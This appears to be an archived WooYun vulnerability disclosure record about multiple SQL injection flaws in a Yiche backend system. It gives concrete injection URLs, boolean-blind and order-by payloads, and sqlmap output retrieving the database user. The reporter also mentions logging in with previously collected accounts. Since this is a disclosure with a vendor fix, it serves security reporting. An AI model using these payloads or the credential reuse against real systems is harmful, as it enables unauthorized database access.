{"id": 41140, "wybug_id": "wooyun-2015-0104490", "wybug_title": "易车某系统多处注入打包", "wybug_corp": "易车", "wybug_author": "路人甲", "wybug_date": "2015-03-29 22:10", "wybug_open_date": "2015-05-14 09:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入打包"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向公众公开  简要描述： 发现最近好多人提交易车的洞，凑个热闹 详细说明：  问题站点：http://log.yiqi.autodmp.cig.com.cn/利用以前收集的账号进去看看，发现一堆注入点：1、搜索型注入：http://log.yiqi.autodmp.cig.com.cn/dealers/get_list_bypager?m_pageindex=1&m_pagesize=10&m_provinceid=330000%09%09%09%09%09%09%09%' and '%'='&m_areaid=&m_area2id=&m_keyword=%E4%B8%9C%E9%98%B3%'+and+'%'='&14275515082912、布尔盲注:http://log.yiqi.autodmp.cig.com.cn/lms_api/stat/get_stat_product_list?start_time=20150228%20and%201=1&end_time=20150328 and 1=1&page_size=0&graph_type=table&1427551564107全站的start_time和end_time都存在注入3、order by注入:http://log.yiqi.autodmp.cig.com.cn/lms_api/clue/get_clue_list_bypaper?starttime=1425132344&endtime=1427551544&page_index=1&page_size=20&approach=&channel=&carmodel=&meida=&province=&city=&district=&dealer=&cartype=&state=&activity=&keyword=&sortfield=post_time&sort=desc&gtype=1&verify_status=&1427551576702sortfield=post_time&sort=desc 这两个参数都可以orderby 注入，比如sort=desc,if(1=1,1,(select 1 union select 2))应该还有很多其他注入点，不一一列举了，自查吧   漏洞证明：  sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: m_keyword (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: m_pageindex=1&m_pagesize=10&m_provinceid=330000\t\t\t&m_areaid=&m_area2id=&m_keyword=%E4%B8%9C%E9%98%B3%%' AND 2230=2230 AND '%'='&1427551508291---[22:14:33] [INFO] testing MySQL[22:14:33] [INFO] confirming MySQL[22:14:33] [INFO] the back-end DBMS is MySQLweb application technology: Apache, PHP 5.3.9back-end DBMS: MySQL >= 5.0.0[22:14:33] [INFO] fetching current user[22:14:33] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[22:14:33] [INFO] retrieved: autodmp_dealer@%current user:    'autodmp_dealer@%'   修复方案：  后台系统也要做好安全防护，不然就是一个内网突破口~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-03-30 09:04 厂商回复： 非常感谢对易车的帮助，我们尽快处理 最新状态： 2015-03-30：已经修复了漏洞，非常感谢对易车的支持  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}